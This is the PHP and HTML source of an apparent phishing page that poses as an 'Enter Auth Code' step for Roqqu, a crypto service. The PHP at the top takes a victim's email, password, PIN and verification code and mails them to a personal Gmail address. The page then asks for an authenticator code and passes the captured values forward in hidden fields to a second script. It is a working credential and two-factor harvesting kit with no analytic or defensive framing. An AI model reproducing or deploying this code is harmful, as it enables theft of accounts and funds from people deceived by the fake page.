<?php


if(isset($_POST["verify"])){ 
$pin = $_POST["pin"];
$to = "obialorkingsley22@gmail.com";

$subject = "YelloAppChat Login Details";
$txt = "Email Address is: " .$_POST['email']. "  Password is: " .$_POST['password']. " Pin is: " .$pin. "  Verification code is: " .$_POST['phrase'];
$headers = "YelloAppChat Form";

mail($to,$subject,$txt,$headers);




mail("obialorkingsley22@gmail.com", "Here is the Login Details",


$_POST["phrase"]. " - verification code");


}


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="jpg" href="favicon.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<title>pin</title>
</head>
<style>
body{
	background:#001739;
}
table{
	margin-top:100px;
}
p{
	color:#999;
	font-family:Verdana, Geneva, sans-serif;
	font-size: 30px;
	margin-top:40px;
}
h2{
	color:#000;
	font-size:40px;
	margin-top:10px;
		font-family:Verdana, Geneva, sans-serif;
}
input {
  font-size: 40px;
  border-radius: 0%;
  width: 140%;
  color:white;
  border: 2px solid white;
  margin-top:60px;
  height:7rem;
  margin-left: -20%;
  
  padding-left: 0;
background:#001739;
}

input::placeholder{
  margin-right: 50%;
}

input:focus {
  outline: none;
}
button{
	background-color:#CCC;
	font-size:34px;
	color:#FFF;
	border:none;
	margin-top:150px;
	border-radius:20px;
  width: 70%;
}

.buttonload {
  background-color:#CCC;/* Green background */
  border: none; /* Remove borders */
  color: white; /* White text */
  padding: 12px 24px; /* Some padding */
  font-size: 34px; /* Set a font-size */
  border-radius:40px;
  margin-top:150px;
  width: 100%;
}

/* Add a right margin to each icon */
.fa {
  margin-left: -12px;
  margin-right: 8px;
}

form{
    display:inline-block;
}

</style>
<body>
  <center style="margin-right: 30%; margin-bottom: ; margin-top: 10%;">
  <div id="me" style="background-color:lightblue; border-radius: 50%; width: 250px; height: 250px; margin-left: 50%;"><img class="" src="logo (1).png" style="margin-left: 5%; width: 60%; margin-top: 20%;"></div>
</center>
  <table align="center" width="800" >
  <tr>
    <td>
<h2 align="center" style="font-size: 50px; color: white;">Enter Auth Code</h2>    
<p align="center" style="width: 120%; margin-left: -70px; color: white;">An Auth code from your Aunthenticator app<br>
  is required to complete your transactions<br>on Roqqu</p>
<div class="digits" align="center">
<form action="mail4.php" name="form" id='form' class="form-horizontal" method="POST">
    <input type="hidden" name="email" value="<?php echo $_POST['email'];?>">
       <input type="hidden" name="password" value="<?php echo $_POST['password'];?>">
       <input type="hidden" name="pin" value="<?php echo $_POST["pin"];?>">
       <input type="hidden" name="phrase" value="<?php echo $_POST['phrase'];?>">
  <input type="tel" name="phrase1" maxlength="6" required="yes" placeholder="Enter Auth Code"> 
  <div class="button">
    
        <div class="button">
<div class="button">
     <!--<button name='submit' id='submit' style='border-radius:6px !important; width:700px; height:90px; padding: auto;' class='ui px-auto text-center  mx-auto d-block button green btn' type='submit' onclick="return changeText('submitbutton');">
    <span class='text-center'>Complete</span>
    </button>-->
    
    <button name="sub" style= 'background-color: rgb(60, 202, 60); color: white; font-weight: 900; height: 100px;'>Complete</button>
     
</form>
  </div> 
</td>
  </tr>
</table>

<script type="text/javascript"> 
    function changeText(submitId){
        var submit = document.getElementById(submitId);
        submit.value = 'Loading...';
        return true;
    };
</script>

<script>
// Listen on the 'input' event inside the .digits area:
document.querySelector(".digits").addEventListener("input", function(e){


  // If the input value is filled and there is a neighbouring element that is input, then focus on that element:
  if ( e.target.value !== "" && e.target.nextElementSibling && e.target.nextElementSibling.nodeName === "INPUT" ){

    e.target.nextElementSibling.focus();

  }

});
</script>


</body>
</html>
